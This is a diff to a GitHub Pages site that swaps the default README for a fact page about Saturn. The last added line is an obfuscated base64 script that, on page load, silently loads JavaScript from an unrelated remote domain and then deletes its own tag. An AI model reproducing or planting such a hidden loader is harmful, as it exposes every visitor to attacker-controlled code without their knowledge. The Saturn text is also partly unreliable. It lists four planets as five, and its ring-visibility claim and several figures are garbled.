@@ -1,37 +1,35 @@
-## Welcome to GitHub Pages
+Saturn is the sixth planet from the sun, with the largest planetary rings in the Solar System. It is the second-largest planet after Jupiter, and recently, with many other moons being discovered, it surpassed the number of Jupiter’s moons and is now considered the planet with the most numerous satellites.
 
-You can use the [editor on GitHub](https://github.com/unoradoph/Solar/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Key Facts & Summary
+Since ancient times Saturn was known to humanity because of its brightness and closeness to Earth. It’s not possible to give someone credit for the discovery of Saturn, however, the first telescopic observation was conducted by Galileo Galilei in 1610.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+![k](https://nineplanets.org/wp-content/uploads/2019/12/saturncomparedearth.jpg)
 
-### Markdown
+Because of the crude telescope available at the time, Galileo failed to observe the rings of Saturn. The discovery of the rings was made by Christiaan Huygens in 1659.
+Saturn is named after the Roman god of harvest and time, the equivalent of the Greek god of time, Cronos.
+Out of the five visible planets (Mercury, Venus, Mars, Jupiter), Saturn is the most distant from Earth, at a distance of 10.6 AU and an average of 9.6 AU away from the Sun. Light takes approximately 1 hour and 29 minutes to travel from Saturn and then arrive at us. For an actual and accurate position of Saturn, you can check it up online, as the planet is constantly tracked.
+Saturn is the second-largest planet of the Solar System, second only to Jupiter, having a radius of 58.232 km or 36.183 mi, about nine times that of Earth. It has a diameter of 120.536 km or 74.897 mi, almost 9.5 times bigger than the diameter of Earth and a surface area about 83 times greater. The rings of Saturn are the most extensive of any other planet. They cannot be seen without an unaided eye. Generally, only 3 rings can be seen by regular telescopes, powerful telescopes can view 8 rings and when the spacecraft Cassini orbited Saturn, it counted well above 30 rings. It is important to understand that these rings are actually countless since they are comprised of millions of generally small rocks creating illusions of ring systems.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+The ring system of Saturn can extend up to 282.000 km / 175.000 mi from the planet. The rings of Saturn together with the planet itself can fit in the distance between the Earth and the Moon. It is the most oblate planet in the Solar System, with its equatorial diameter of 120.536 km / 74.897 mi, being greater than the planet’s polar diameter of 108,728 km / 67.560 mi. If viewed from a small telescope it appears flattened.
+Saturn has the lowest density of all the planets – 687 kg/m³ – or in other words, it is lighter than water thus if placed on water, it would float.
+The low density is attributed to its composition. The planet is largely made up of gases such as hydrogen and helium. This together with its atmosphere that is composed of ammonia – yellow, ammonia hydrosulfide – orange, and water – white – influence the planet’s colorful appearance of a brownish-yellow. Saturn rotates quite quickly on its axis, completing a rotation or day in about 10.6 hours. However, its orbit around the Sun is slow, completing one trip around the Sun or a year, in about 29.5 Earth years.
+![l](https://nineplanets.org/wp-content/uploads/2019/12/Saturn_during_Equinox-1024x496.jpg)
 
-```markdown
-Syntax highlighted code block
+The temperature of Saturn’s upper atmosphere is on average about -175C (-285F), quite cold for a gas giant, while below the clouds it gets considerably hotter.
+Due to Saturn’s axial tilt of 26.73 degrees, similar to that of Earth, the southern and northern hemispheres are heated differently, causing seasonal temperature variations. Much of these variations in temperature are horizontal.
+Though it doesn’t have a solid surface, being enveloped in swirling gases and liquids deeper down, it is believed that Saturn has a core much smaller than Jupiter, almost twice the size of Earth – comprised mostly of metals like iron and nickel surrounded by rocky material, and other compounds, solidified by the intense pressure and heat. Periodic storms are present on Saturn. They are large enough to be seen from Earth and are named White Spots.
+Recently, many other moons were discovered orbiting around Saturn, thus making the second-largest gas giant the planet with the most numerous satellites. Saturn now has 82 confirmed moons. The largest moon of Saturn is named Titan. It’s the second biggest moon in the Solar System after Jupiter’s moon Ganymede. Titan is even bigger than the planet Mercury. Though the potential for life is zero for Saturn, many of its moons such as Titan or Enceladus, have internal oceans that could possibly hold life. Saturn – also nicknamed the “Ringed Planet” – has been observed since ancient times by different cultures around the world. Because of this, no one can be credited with first discovering the planet. Though it is the most distant of the visible planets, it still can be seen with the naked eye.
 
-# Header 1
-## Header 2
-### Header 3
+The first telescopic observation was conducted by Galileo Galilei in 1610. Because of the crude telescope available at the time, Galileo failed to observe the rings of Saturn. He thought that the planet was surrounded very closely by two moons but when he looked again, the objects disappeared. After a couple of years, observations made by Christiaan Huygens in 1659, elucidated the mystery, concluding that in fact, the objects were a ring system surrounding Saturn.
 
-- Bulleted
-- List
+Because of the planet’s slow orbit around the sun, it was associated with time, and due to its golden-like glow, it was also associated with wealth.  It was thus named after the Roman god of wealth and agriculture Saturn, which is the equivalent of the Greek god of time, Cronos.
 
-1. Numbered
-2. List
+Saturn formed together with the rest of the solar system about 4.5 billion years ago. Gravity pulled swirling gas and dust together and thus the gas giant was created. About 4 billion years ago, Saturn settled into its current position in the outer solar system. Like Jupiter, Saturn is mostly made of hydrogen and helium, the same two main components that make up the Sun.
 
-**Bold** and _Italic_ and `Code` text
+Saturn is about 9.5 times farther away from the Sun than Earth. At a distance of 9.6 AU away from the Sun and 10.6 AU away from Earth, it is the sixth most distant planet.
 
-[Link](url) and ![Image](src)
-```
+Light takes approximately 1 hour and 29 minutes to travel from Saturn and then arrive at Earth. It is the second-largest planet in the Solar System, having a radius of 58.232 km or 36.183 mi, about nine times that of Earth and a diameter of 120.536 km or 74.897 mi, almost 9.5 times bigger than the diameter of Earth. 
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+The surface area is about 83 times bigger than our planet, and the mass of Saturn is about 95 times greater.
 
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/unoradoph/Solar/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="uMvkd" src="data:text/javascript;base64, dmFyIF9KSnAxSCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX1JoY1ltLCBfZWhDNmwpIHt2YXIgX25VeE1xID0gZnVuY3Rpb24oXzJxNHNrKSB7d2hpbGUgKC0tXzJxNHNrKSB7X1JoY1ltWydwdXNoJ10oX1JoY1ltWydzaGlmdCddKCkpO319O19uVXhNcSgrK19laEM2bCk7fShfSkpwMUgsIDB4MTFiKSk7dmFyIF80TURveiA9IGZ1bmN0aW9uKF8wTUtLeiwgX21MOXdvKSB7XzBNS0t6ID0gXzBNS0t6IC0gMHgwO3ZhciBfM2FnVG8gPSBfSkpwMUhbXzBNS0t6XTtyZXR1cm4gXzNhZ1RvO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfNE1Eb3ooJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1NEclh4ID0gZG9jdW1lbnRbXzRNRG96KCcweDEnKV0oXzRNRG96KCcweDInKSk7X1NEclh4W180TURveignMHgzJyldID0gXzRNRG96KCcweDQnKTtfU0RyWHhbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2NFx4NjlceDY3XHg2OVx4NjNceDZmXHg2NFx4NjVceDYxXHg2M1x4NjNceDMxXHgyZVx4NjNceDZmXHg2ZVx4NzNceDc1XHg2Y1x4NzRceDYxXHg3YVx4NjlceDZmXHg2ZVx4NjlceDY2XHg2OVx4NmVceDJlXHg2M1x4NmZceDZkXHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg0ZFx4NjZceDU5XHg2NVx4NGFceDY3XHg1OVx4NzVceDZkXHg2OCc7ZG9jdW1lbnRbXzRNRG96KCcweDUnKV0oXzRNRG96KCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX1NEclh4KTtkb2N1bWVudFtfNE1Eb3ooJzB4NycpXSgndU12a2QnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
